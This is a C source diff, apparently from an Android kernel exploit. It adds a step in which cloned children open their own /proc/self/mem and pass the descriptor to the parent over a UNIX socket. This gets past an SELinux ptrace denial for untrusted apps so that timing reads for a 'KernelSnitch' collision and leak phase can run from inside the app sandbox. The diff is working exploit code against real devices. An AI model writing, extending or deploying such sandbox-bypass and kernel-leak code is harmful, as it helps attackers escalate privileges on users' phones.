@@ -1520,7 +1520,98 @@ int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
   return 0;
 }
 
+/* ---- /proc/self/mem fd handoff ------------------------------------------
+ * app-domain (untrusted_app, SELinux Enforcing): the parent cannot open
+ * /proc/<child>/mem -- the SELinux ptrace check denies it even for a
+ * same-uid same-domain child (observed 2026-10-20: SYSCHK(open(path,
+ * O_RDONLY)): Permission denied right after the collision phase).  The fd,
+ * however, carries no restrictions after open, and the child may always
+ * open its OWN /proc/self/mem.  So the child self-opens and hands the fd
+ * to the parent over a socketpair (SCM_RIGHTS); semantics are identical --
+ * FMODE_UNSIGNED_OFFSET means the mm is not pinned, so the fd times preads
+ * against the child's mm exactly like a parent-opened /proc/<pid>/mem.
+ * Shell domain uses the same path (self-open is allowed everywhere), with
+ * the direct /proc/<pid>/mem open kept as a fallback. */
+struct memxfer {
+  pid_t child;
+  int sv;
+};
+static struct memxfer *memx;
+static size_t memx_n, memx_cap;
+
+static void memx_push(pid_t child, int sv) {
+  if (memx_n == memx_cap) {
+    memx_cap = memx_cap ? memx_cap * 2 : 64;
+    memx = realloc(memx, memx_cap * sizeof(*memx));
+    SYSCHK(memx);
+  }
+  memx[memx_n].child = child;
+  memx[memx_n].sv = sv;
+  memx_n++;
+}
+
+static int memx_take_sv(pid_t child) {
+  for (size_t i = 0; i < memx_n; i++) {
+    if (memx[i].child == child) {
+      int sv = memx[i].sv;
+      memx[i] = memx[--memx_n];
+      return sv;
+    }
+  }
+  return -1;
+}
+
+static int recv_memfd(int sv, int timeout_ms) {
+  struct pollfd p = {.fd = sv, .events = POLLIN};
+  if (poll(&p, 1, timeout_ms) <= 0) {
+    return -1;
+  }
+  int fd = -1;
+  struct msghdr msg = {0};
+  struct iovec iov;
+  char b;
+  char cbuf[CMSG_SPACE(sizeof(int))];
+  iov.iov_base = &b;
+  iov.iov_len = 1;
+  msg.msg_iov = &iov;
+  msg.msg_iovlen = 1;
+  msg.msg_control = cbuf;
+  msg.msg_controllen = sizeof(cbuf);
+  if (recvmsg(sv, &msg, 0) <= 0) {
+    return -1;
+  }
+  struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
+  if (c && c->cmsg_level == SOL_SOCKET && c->cmsg_type == SCM_RIGHTS) {
+    memcpy(&fd, CMSG_DATA(c), sizeof(int));
+  }
+  return fd;
+}
+
+static void child_handoff_memfd(int sv[2]) {
+  int fd = SYSCHK(open("/proc/self/mem", O_RDONLY));
+  struct msghdr msg = {0};
+  struct iovec iov;
+  char b = 'x';
+  char cbuf[CMSG_SPACE(sizeof(int))];
+  iov.iov_base = &b;
+  iov.iov_len = 1;
+  msg.msg_iov = &iov;
+  msg.msg_iovlen = 1;
+  msg.msg_control = cbuf;
+  msg.msg_controllen = sizeof(cbuf);
+  struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
+  c->cmsg_level = SOL_SOCKET;
+  c->cmsg_type = SCM_RIGHTS;
+  c->cmsg_len = CMSG_LEN(sizeof(int));
+  memcpy(CMSG_DATA(c), &fd, sizeof(int));
+  SYSCHK(sendmsg(sv[1], &msg, 0));
+  close(fd);
+  close(sv[1]);
+}
+
 pid_t clone_child(void) {
+  int sv[2];
+  SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, sv));
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
     ks_child_no_atexit = 1;
@@ -1528,18 +1619,26 @@ pid_t clone_child(void) {
     if (getppid() == 1) {
       _exit(0);
     }
+    close(sv[0]);
+    child_handoff_memfd(sv);
     pin_to_core(CORE);
     for (;;) {
       pause();
     }
   }
+  close(sv[1]);
+  memx_push(child, sv[0]);
   return child;
 }
 
 pid_t clone_leak_child(void) {
+  int sv[2];
+  SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, sv));
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
     ks_child_no_atexit = 1;
+    close(sv[0]);
+    child_handoff_memfd(sv);
     kernelsnitch_find_collisions(ks);
     /* _exit, not exit: the child must NOT run the parent's inherited atexit
      * handlers (route_pi_release_atexit does FUTEX_UNLOCK_PI against the
@@ -1548,10 +1647,22 @@ pid_t clone_leak_child(void) {
      * the parent's route/guard state. */
     _exit(0);
   }
+  close(sv[1]);
+  memx_push(child, sv[0]);
   return child;
 }
 
 int open_memfd(pid_t child) {
+  int sv = memx_take_sv(child);
+  if (sv >= 0) {
+    int fd = recv_memfd(sv, 2000);
+    close(sv);
+    if (fd >= 0) {
+      return fd;
+    }
+    pr_warning("memfd handoff timeout pid=%d; direct open fallback\n",
+               (int)child);
+  }
   char path[64];
   snprintf(path, sizeof(path), "/proc/%d/mem", child);
   return SYSCHK(open(path, O_RDONLY));
